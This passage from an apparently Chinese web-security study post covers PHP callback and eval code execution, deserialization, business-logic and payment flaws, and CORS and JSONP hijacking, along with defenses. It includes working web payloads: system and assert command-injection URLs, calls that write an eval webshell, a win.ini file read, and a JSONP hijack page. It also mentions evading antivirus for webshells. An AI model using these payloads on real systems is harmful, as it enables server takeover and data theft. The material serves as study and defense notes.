<p>call_user_func — 把第一个参数作为回调函数调用，其余参数是回调函数的参数。</p>
<p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数。</p>
<p><strong>7.array_filter()</strong></p>
<p>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
<p>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array1</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$func</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$array1</span>,<span class="hljs-variable">$func</span>);<br><span class="hljs-meta">?&gt;</span><br>-test.php?func=system&amp;cmd=whoami<br></code></pre></td></tr></table></figure>
<p><strong>8.usort()/uasort()</strong></p>
<p>usort() 通过用户自定义的比较函数对数组进行排序。</p>
<p>uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。</p>
<blockquote>
<p>php环境&gt;=5.6才能用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">usort</span>(...<span class="hljs-variable">$_GET</span>);<span class="hljs-meta">?&gt;</span><br>利用方式：<br>test.php?<span class="hljs-number">1</span>[]=<span class="hljs-number">1</span>-<span class="hljs-number">1</span>&amp;<span class="hljs-number">1</span>[]=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;x&#x27;</span>])&amp;<span class="hljs-number">2</span>=assert<br>[POST]:x=<span class="hljs-title function_ invoke__">phpinfo</span>();<br><br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$_GET</span>,<span class="hljs-string">&#x27;asse&#x27;</span>.<span class="hljs-string">&#x27;rt&#x27;</span>);<span class="hljs-meta">?&gt;</span><br>利用方式：<br>test.php?<span class="hljs-number">1</span>=<span class="hljs-number">1</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">2</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[x])<br>[POST]:x=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure>
<p><strong>9.file_put_contents()/fputs()</strong></p>
<p>file_put_contents() 函数把一个字符串写入文件中。</p>
<p>fputs() 函数写入文件。</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">访问直接写入：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-variable">$test</span>=<span class="hljs-string">&#x27;&lt;?php eval($_POST[&#x27;</span>cmd<span class="hljs-string">&#x27;]);?&gt;&#x27;</span>;</span><br><span class="language-php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;test1.php&#x27;</span>,<span class="hljs-variable">$test</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php eval($_POST[&#x27;</span>cmd<span class="hljs-string">&#x27;])?&gt;&#x27;</span>); </span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">参数写入：</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];</span><br><span class="language-php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">文件读取：</span><br><span class="language-xml">		?cmd=var_dump(file_get_contents(&quot;c:\windows\win.ini&quot;));</span><br><span class="language-xml"></span><br><span class="language-xml">获取绝对路径：</span><br><span class="language-xml">		?cmd=print(__FILE__);</span><br><span class="language-xml"></span><br><span class="language-xml">file_put_contents()函数写入一句话木马：(需知道绝对路径)</span><br><span class="language-xml">		?cmd=file_put_contents(&#x27;shell.php&#x27;,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;x&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;);</span><br><span class="language-xml"></span><br><span class="language-xml">fputs()函数写入一句话木马：</span><br><span class="language-xml">    ?cmd=fputs(fopen(&quot;info.php&quot;,&quot;w&quot;),&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);</span><br></code></pre></td></tr></table></figure>
<p><strong>10.动态函数</strong></p>
<p>PHP函数直接由字符串拼接。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-comment">//函数名(形参)    </span><br><span class="hljs-meta">?&gt;</span><br>-test.php?a=assert&amp;b=<span class="hljs-title function_ invoke__">phpinfo</span>()<br></code></pre></td></tr></table></figure>
<h3 id="漏洞防护-v2"><a class="header-anchor" href="#漏洞防护-v2">¶</a>漏洞防护</h3>
<ol>
<li>使用 json 保存数组，当读取时就不需要使用 eval 了 ；</li>
<li>对于必须使用 eval 的地方，一定严格处理用户数据（白名单、黑名单）；</li>
<li>字符串使用单引号包括可控代码，插入前使用 addslashes 转义（addslashes、魔数引号、 htmlspecialchars、 htmlentities、mysql_real_escape_string） ；</li>
<li>放弃使用 preg_replace 的 e 修饰符，使用 preg_replace_callback()替换（preg_replace_callback()）；</li>
<li>若必须使用 preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象（preg_replace+正则） 。</li>
</ol>
<h3 id="问题-v7"><a class="header-anchor" href="#问题-v7">¶</a>问题</h3>
<p><strong>1.造成命令执行与代码执行漏洞的高危函数都有哪些?</strong></p>
<p><strong>2.命令/代码执行漏洞处无法GetShell思路如何？</strong></p>
<ul>
<li>
<p><strong>1.对写入的一句话木马做免杀操作，尝试写入</strong></p>
</li>
<li>
<p><strong>2.反弹Shell并执行文件下载在去GetShell</strong></p>
</li>
</ul>
<h1>反序列化漏洞-PHP</h1>
<h2 id="原理-v8"><a class="header-anchor" href="#原理-v8">¶</a>原理</h2>
<p>反序列化又叫对象注入，序列化在内部没有漏洞，漏洞产生是因为程序在处理对象、魔术函数以及序列化相关的问题导致的，当传给 unserialize()的参数可控时，那么用户就可以注入 payload，进行反序列化的时候就可能触发对象中的一些魔术方法。</p>
<h3 id="序列化"><a class="header-anchor" href="#序列化">¶</a>序列化</h3>
<p>序列化的目的是方便数据的传输和存储。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">string serialize ( mixed  <span class="hljs-variable">$value</span> )<br><span class="hljs-function"><span class="hljs-title">serialize</span><span class="hljs-params">()</span></span>  返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 <br></code></pre></td></tr></table></figure>
<ol>
<li>
<p>字符串序列化</p>
</li>
<li>
<p>数组序列化</p>
</li>
<li>
<p>对象序列化</p>
</li>
</ol>
<p>O:4:“test”:1:{s:1:“a”;s:4:“test”;}</p>
<p>序列化格式介绍：O表示类 4表示类名长度 test是类名 1代表类中有一个属性 s 字符串 1 长度1位 a是属性名 test 是属性的值。</p>
<p><strong>含义与扩展</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"># 序列化字符含义<br>● a – <span class="hljs-built_in">array</span> 数组 <br>● b – <span class="hljs-built_in">bool</span>ean 布尔型 <br>● d – <span class="hljs-built_in">double</span> 双精度型 <br>● i – <span class="hljs-built_in">int</span>eger 整型 <br>● o – common object 一般对象 <br>● r – <span class="hljs-built_in">ref</span>erence   引用<br>● s – <span class="hljs-built_in">string</span> 字符串 <br>● C – custom object 自定义对象 <br>● O – <span class="hljs-keyword">class</span> <span class="hljs-symbol">N</span> – <span class="hljs-symbol">null</span> 表示类 <br>● <span class="hljs-symbol">R</span> – <span class="hljs-symbol">pointer</span> <span class="hljs-symbol">reference</span> 引用传递<br>● <span class="hljs-symbol">U</span> – <span class="hljs-symbol">unicode</span> <span class="hljs-symbol">string</span> <span class="hljs-symbol">unicode</span>编码的字符串  <br></code></pre></td></tr></table></figure>
<blockquote>
<p>private、public、protected是保留字，是成员访问限定符，其后必须跟冒号<br>
（1）private：只能被本类中的成员函数访问，类外（除友元外）不能访问。<br>
（2）public：公有成员可以被本类的成员函数访问，也能在类的作用域范围内的其他函数访问。<br>
（3）protected：受保护成员可由本类的成员函数访问，也能由派生类的成员函数访问。</p>
</blockquote>
<h2 id="反序列化漏洞"><a class="header-anchor" href="#反序列化漏洞">¶</a>反序列化漏洞</h2>
<p>当程序在进行反序列化时，会自动调用一些函数，例如wakeup(),destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。</p>
<p><strong>魔术方法</strong></p>
<p>魔术方法：PHP中一般是以__开头，通常会因为某些条件而触发不用手动调用</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs scss">●  <span class="hljs-built_in">__construct</span>() <br>当一个对象创建时被调用（ 构造函数，当对象创建(new)时会自动调用。 <span class="hljs-built_in">unserialize</span>()反序列化时是不会自动调用的。  ）； <br>● <span class="hljs-built_in">__destruct</span>() <br>当一个对象销毁前被调用 ；<br>● <span class="hljs-built_in">__sleep</span>() <br>在对象被序列化前被调用 （ 用于提交未提交的数据，或类似的清理操作  ）；<br>● __wakeup <br>将在反序列化之后立即被调用（当使用<span class="hljs-built_in">unserialize</span>()进行反序列话时，就会被调用， <span class="hljs-built_in">unserialize</span>()时会检查是否存在 <span class="hljs-built_in">__wakeup</span>()，如果存在，则会优先调用 <span class="hljs-built_in">__wakeup</span>()方法  ）；<br>● __toString <br>当一个对象被当做字符串使用时被调用 ；<br>● <span class="hljs-built_in">__get</span>(),<span class="hljs-built_in">__set</span>() <br>当调用或设置一个类及其父类方法中未定义的属性时 ；<br>● <span class="hljs-built_in">__invoke</span>() <br>调用函数的方式调用一个对象时的回应方法 ；<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 扩展魔术方法</span><br>（<span class="hljs-number">1</span>）__call：调用不可访问或不存在的方法时被调用<br>（<span class="hljs-number">2</span>）__callStatic：调用不可访问或不存在的静态方法时被调用<br>（<span class="hljs-number">3</span>）__clone：进行对象<span class="hljs-keyword">clone</span>时被调用<br>（<span class="hljs-number">4</span>）__isset：对不可访问或不存在的属性调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()被调用<br>（<span class="hljs-number">5</span>）__unset：对不可访问或不存在的属性进行<span class="hljs-keyword">unset</span>时被调用<br></code></pre></td></tr></table></figure>
<h3 id="条件-v2"><a class="header-anchor" href="#条件-v2">¶</a><strong>条件</strong></h3>
<ol>
<li>代码中有可利用的类，并且类中有wakeup()，sleep()，__destruct()这类特殊条件下可以自己调用的魔术方法。</li>
<li>unserialize()函数的参数可控。</li>
</ol>
<h3 id="防御"><a class="header-anchor" href="#防御">¶</a>防御</h3>
<p>（1）安全配置好php相关参数</p>
<p>通过Php配置文件里面有个disable_functions = 配置<br>
这个禁止某些php函数，服务器便是用这个来禁止php的执行命令函数</p>
<p>禁止这些函数来执行系统命令</p>
<p>例：disable_functions =system,passthru,shell_exec，exec，popen</p>
<p>（2）严格控制传入变量，严谨使用魔法函数</p>
<h3 id="问题-v8"><a class="header-anchor" href="#问题-v8">¶</a>问题</h3>
<p>-1.什么是反序列化漏洞与原理？</p>
<p>-2.造成反序列化漏洞的高危函数与魔术方法?</p>
<p>-3.反序列化漏洞的修补方式？</p>
<h3 id="经典反序列化漏洞（待补充）"><a class="header-anchor" href="#经典反序列化漏洞（待补充）">¶</a>经典反序列化漏洞（待补充）</h3>
<h4 id="fastjson"><a class="header-anchor" href="#fastjson">¶</a>fastjson</h4>
<h1>业务逻辑漏洞</h1>
<img src="/posts/d62edc36/image-20230728161632099.png" class>
<h2 id="越权"><a class="header-anchor" href="#越权">¶</a>越权</h2>
<p><strong>水平越权</strong>：指攻击者尝试访问与他拥有相同权限的用户资源。</p>
<p><strong>垂直越权</strong>是一种 “基于URL的访问控制” 设计缺陷引起的漏洞，垂直越权可以分为两种，分别是向上越权和向下越权。</p>
<blockquote>
<p>服务器为鉴别客户端浏览器会话及身份信息，会将用户身份信息存储在 Cookie 中，并发送至客户端存储。攻击者通过修改 Cookie 中的身份标识为管理员，欺骗服务器分配管理员权限，达到垂直越权的目的</p>
</blockquote>
<h3 id="挖掘"><a class="header-anchor" href="#挖掘">¶</a>挖掘</h3>
<p><strong>越权挖掘位置</strong><br>
● 个人资料的地址<br>
● 下订单的地址<br>
● 收获地址<br>
● 越权评论商品<br>
● 越权删除数据</p>
<p><strong>挖掘方法</strong><br>
● get请求address_id参数<br>
● post请求address_id参数<br>
● cookie中的键值对</p>
<h3 id="防护-v3"><a class="header-anchor" href="#防护-v3">¶</a>防护</h3>
<ol>
<li>基础安全架构，完善用户权限体系。要知道哪些数据对于哪些用户，哪些数据不应该由哪些用户操作；</li>
<li>鉴权，服务端对请求的数据和当前用户身份做校验；</li>
<li>不要直接使用对象的实名或关键字；</li>
<li>对于可控参数进行严格的检查与过滤。</li>
</ol>
<h3 id="支付漏洞"><a class="header-anchor" href="#支付漏洞">¶</a>支付漏洞</h3>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 修改支付状态</span><br>原理：如果支付状态的值未和实际订单支付状态进行校验，攻击者点击支付时抓包修改支付状态的参数为支付状态的值就能实现修改支付状态<br><br><span class="hljs-meta"># 修改购买数量</span><br>原理：抓包并修改商品的数量，如果修改数量后，总价格没有跟随数量的变化而变化；再者将数量修改为负数，如果总价格跟着变为负数。这二种可能都导致支付问题的产生<br><br><span class="hljs-meta"># 修改优惠券、积分</span><br>原理：根据优惠券的使用条件方式，尝试修改优惠劵金额、商品价格、折扣程度等<br><br><span class="hljs-meta"># 修改支付接口</span><br>原理：因为支付肯定会有提供很多支付平台供用户选择，每个支付接口的值肯定是不一样的，如果支付的逻辑存在漏洞，或者接口相关处理存在不足，此时对支付过程抓包，将支付接口修改为不存在的接口，等待平台的支付处理结果（一般不可能了）<br><br><span class="hljs-meta"># 交叉替换支付</span><br>原理：顾名思义，选择<span class="hljs-number">2</span>个不同商品，分别产生两个订单支付，对其都进行抓包，修改其订单一的值为订单二的值，如果平台没有验证商品相关信息和用户应支付价格，就可以尝试用订单二的支付价格去买到订单一的商品，因此产生了替换支付。<br><br><span class="hljs-meta"># 无限制试用</span><br>原理：试用类商品，如果产生多个订单并进行提交的校验，那么就可导致无限制刷牌子，每次提交的订单号不一样，相当于对同一个商品的多次试用的订单，如果存在逻辑漏洞的话，假设你全部申请退出试用，那么就会退相应数量的试用资格到你用户<br><br><span class="hljs-meta"># 最小支付额限制</span><br>原理：最小支付额是平台对支付价格的一个限制规则，当恶意修改支付价格后，如果支付价格小于最小支付额，会导致支付失败等问题（失败不代表不存在漏洞，可能是价格改的太小了）<br><br><span class="hljs-meta"># 最大值支付问题</span><br>原理：当支付值过大，超过逻辑处理规则（即存在支付逻辑漏洞），可将支付价格、优惠券等尝试修改为最大值，并观察支付结果的变化。<br><br><span class="hljs-meta"># 试用接口问题</span><br>原理：毋庸置疑，对于产品的试用，一个账户一般只能试用一次，如果接口<span class="hljs-number">1</span>是试用接口，接口<span class="hljs-number">2</span>是支付接口，如果抓包后将接口改为接口<span class="hljs-number">2</span>，如果接口存在逻辑处理问题，以试用价格去支付，就是可能为<span class="hljs-number">0</span>元。<br></code></pre></td></tr></table></figure>
<h3 id="短信-邮箱轰炸漏洞"><a class="header-anchor" href="#短信-邮箱轰炸漏洞">¶</a>短信/邮箱轰炸漏洞</h3>
<h3 id="利用Cookie-Session"><a class="header-anchor" href="#利用Cookie-Session">¶</a>利用Cookie&amp;Session</h3>
<blockquote>
<p><code>session </code>机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表） 来保存信息。 当程序需要为某个客户端的请求创建一个 session 的时候，服务器首先检查这个客户端的请求里是否已包含了一个 session 标识，称为 session id，如果已包含一个 session id 则说明以前已经为此客户端创建过 session，服务器就按照 session id 把这个 session 检索出来使用（如果检索不到，可能会新建一个），如果 客户端请求不包含 session id，则为此客户端创建一个 session 并且生成一个与此 session 相关联的 session id， session id 的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个 session id 将被在本次响 应中返回给客户端保存。</p>
<p>保存这个 session id 的方式可以采用 cookie，这样在交互过程中浏览器可以自动的按照规则把这个标识发送给服务器。</p>
</blockquote>
<h4 id="Session的特点"><a class="header-anchor" href="#Session的特点">¶</a>Session的特点</h4>
<p>session 一般用于登录验证 。</p>
<p>session 的存活周期：<br>
○ 默认关闭浏览器，session 就会消失。<br>
○ 在程序中设置 session 的过期时间。</p>
<p>session 是存在于服务器里，cookie 是存在于客户端的。</p>
<p>session 的机制：</p>
<ol>
<li>是会在浏览器生成一个 cookie session_id 也会在服务器里生成一个 session id 文件，假如在做身份证认证的时候就会在这个服务器里的文件写入要验证的内容。</li>
<li>在 php 里 session 的存放位置是在 php.ini 里设置的，也可以通过函数设置在其他位置 。</li>
</ol>
<h4 id="Cookie"><a class="header-anchor" href="#Cookie">¶</a>Cookie</h4>
<p><strong>区别</strong></p>
<p>​		session 机制采用的是在<strong>服务器端</strong>保持状态的方案，而 cookie 机制则是在<strong>客户端</strong>保持状态的方案，Cookie 是由 HTTP 服务器设置的，保存在浏览器中cookie 又叫会话跟踪机制。打开一次浏览器到关闭浏览器算是一次会话。说到这里，讲下 HTTP 协议，前面提到， HTTP 协议是一种无状态协议，在数据交换完毕后，服务器端和客户端的链接就会关闭，每次交换数据都需要建立新的链接。此时，服务器无法从链接上跟踪会话。cookie 可以跟踪会话，弥补 HTTP 无状态协议的 不足。</p>
<p><strong>Cookie分类</strong></p>
<p>cookie 分为<strong>会话 cookie</strong> 和<strong>持久 cookie</strong></p>
<p>会话 cookie 是指在不设定它的生命周期 expires 时的状态</p>
<p>浏览器的开启到关闭就是一次会话，当关闭浏览器时，会话 cookie 就会跟随浏览器而销毁。当关闭一个页面时，不影响会话 cookie 。</p>
<p>持久 cookie 则是设定了它的生命周期 expires</p>
<p>关闭浏览器之后，它不会销毁，直到设定的过期时间。对于持久 cookie，可以在同一个浏览器中传递数据。</p>
<p><strong>漏洞</strong></p>
<p>Cookie仿冒</p>
<p>Cookie登录绕过漏洞</p>
<p><strong>防御</strong></p>
<ol>
<li>使用 cookie 身份验证时，不要使用简单的验证，对外部输入的参数进行过滤.。</li>
<li>尽量使用  session 安全认证，session 是外部不可控的。</li>
</ol>
<p><strong>业务逻辑漏洞推荐书籍</strong></p>
<p>《Web攻防之业务安全实战指南》</p>
<h1>未授权访问</h1>
<p>总结：无</p>
<h1>Jsonp&amp;Cors</h1>
<h2 id="基础知识-v3"><a class="header-anchor" href="#基础知识-v3">¶</a>基础知识</h2>
<h3 id="同源策略"><a class="header-anchor" href="#同源策略">¶</a>同源策略</h3>
<p><strong>SOP</strong>，全称为同源策略 (Same Origin Policy)，该策略是浏览器的一个安全基石， 如果没有同源策略，那么，你打开了一个合法网站，又打开了一个恶意网站。那么恶意网站的脚本能够随意的操作合法网站的任何可操作资源，没有任何限制。</p>
<p>两个站点需要满足同协议、同端口、同域名。这三个条件即为 “同源”。</p>
<p><strong>下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;script src=<span class="hljs-string">&quot;...&quot;</span>&gt;	<span class="hljs-regexp">//</span>加载本地js执行<br>&lt;img src=<span class="hljs-string">&quot;...&quot;</span>&gt;	<span class="hljs-regexp">//</span>图片<br>&lt;link href=<span class="hljs-string">&quot;...&quot;</span>&gt;	<span class="hljs-regexp">//</span>css<br>&lt;iframe src=<span class="hljs-string">&quot;...&quot;</span>&gt; <span class="hljs-regexp">//</span>任意资源<br></code></pre></td></tr></table></figure>
<h2 id="CORS"><a class="header-anchor" href="#CORS">¶</a>CORS</h2>
<p>CORS（Cross-Origin Resource Sharing）跨域资源共享，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，<strong>它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AX只能同源使用的限制。</strong></p>
<p>CORS的基本原理是：第三方网站生成访问控制策略，指定用户浏览器放宽SOP的限制，实现与指定的目 标网站共享数据。</p>
<h2 id="漏洞原理"><a class="header-anchor" href="#漏洞原理">¶</a>漏洞原理</h2>
<p>​		因为同源策略的存在，不同源的客户端脚本不能访问目标站点的资源，如果目标站点CORS配置不当，没有对请求源的域做严格限制，导致任意源都可以访问时，就存在cors跨域漏洞问题。</p>
<p>​		攻击者可以利用Web应用对用户请求数据包的Origin头校验不严格，诱骗受害者访问攻击者制作好的恶意网站，从而跨域获取受害者的敏感数据。</p>
<p><strong>CORS跨域漏洞的本质是服务器配置不当</strong></p>
<h3 id="CORS中关键的几个响应头字段如下："><a class="header-anchor" href="#CORS中关键的几个响应头字段如下：">¶</a>CORS中关键的几个响应头字段如下：</h3>
<p>Access-Control-Allow-Origin：指定哪些外域可以访问本域资源；</p>
<p>Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送Cookie。仅当设置为true</p>
<p>时，才会发送Cookie；默认是false</p>
<p>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET、POST、PUT、DELETE</p>
<p>等）来访问资源；</p>
<p>Access-Control-Allow-Headers：指定可以在请求报文中添加的HTTP头字段； Access-Control-Max-Age：指定超时时间；</p>
<h2 id="CORS挖掘思路"><a class="header-anchor" href="#CORS挖掘思路">¶</a>CORS挖掘思路</h2>
<p>CORS的漏洞主要看当我们发起的请求中带有Origin 头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin 的域访问。</p>
<p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。</p>
<h2 id="JSONP"><a class="header-anchor" href="#JSONP">¶</a>JSONP</h2>
<p>JSONP是JSON with   padding（填充式JSON或参数式JSON）的简写，是基于JSON格式达的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用的script标签的src属性不受同源策略影响的特   性，来跨越获取数据。</p>
<p>说人话就是：可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p>
<p>JSONP由两部分组成： 回调函数 、 数据</p>
<p>回调函数是当响应来时，在页面中调用的函数。回调函数的名称一般是在请求中指定的。而数据就是传入回调函数中的JSON数据。</p>
<h2 id="JSONP劫持漏洞"><a class="header-anchor" href="#JSONP劫持漏洞">¶</a>JSONP劫持漏洞</h2>
<p>JSON劫持又称 “JSON Hijacking” 。当网站通过JSONP的方式来跨域传递用户认证后的敏感信息时，<strong>如果服务端对JSONP的请求来源校验不严格，那么攻击者可以构造恶意的JSONP调用页面，诱导被攻击者访问达到截取用户敏感信息的目的</strong>。</p>
<img src="/posts/d62edc36/1690266827967-c7f3cd69-031d-4069-9917-2d915dc64930.jpeg" class title="img">
<p>jsonp 与 csrf 类似，都是需要用户登录帐号，身份认证还没有被消除的情况下访问攻击者精心设计好的的页面。就会获取 json 数据，把 json 数据发送给攻击者。</p>
<p>利用过程：寻找敏感 json 数据 api 接口，构造恶意的代码。 发送给用户，用户访问有恶意的页面，数据会被劫持发送到远程服务器。</p>
<p><strong>产生漏洞的原因</strong>：    网站没有对JSONP请求来源进行校验和过滤导致任意域都能够获取数据。</p>
<h3 id="流程"><a class="header-anchor" href="#流程">¶</a>流程</h3>
<ol>
<li>用户在网站A注册的能路，网站A接口返回数据包含用户的id，name，email等，个人用户数据。</li>
<li>用户打开攻击者发送给用户的URL，向网站B发起请求</li>
<li>网站B向用户返回响应页面，响应页面中包含回调函数和向网站B请求的script标签。</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">jsonp2</span>(<span class="hljs-params">data</span>)&#123; <span class="hljs-title function_">alert</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.xxx.com/api?callback=jsonp2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><code>&lt;script src=&quot;https://www.xxx.com/api?callback=jsonp2&quot;&gt;&lt;/script&gt;</code></p>
<ol start="4">
<li>用户收到响应后，解析JS代码，将回调函数作为参数向网站A发送请求</li>
<li>网站A收到请求后，以JSON格式生成请求需要的数据（用户信息）将数据作为回调函数的参数返回给浏览 器。</li>
</ol>
<p>json2({“id”:1,“name”:“test”,“email”:“<a href="mailto:test@test.com">test@test.com</a>”})</p>
<ol start="6">
<li>网站B收到响应数据后，浏览器自动执行回调函数，将返回的数据进行弹窗处理.</li>
</ol>
<blockquote>
<p>PS：SRC挖掘中只有返回了敏感信息的jsonp劫持才能算是有危害。</p>
</blockquote>
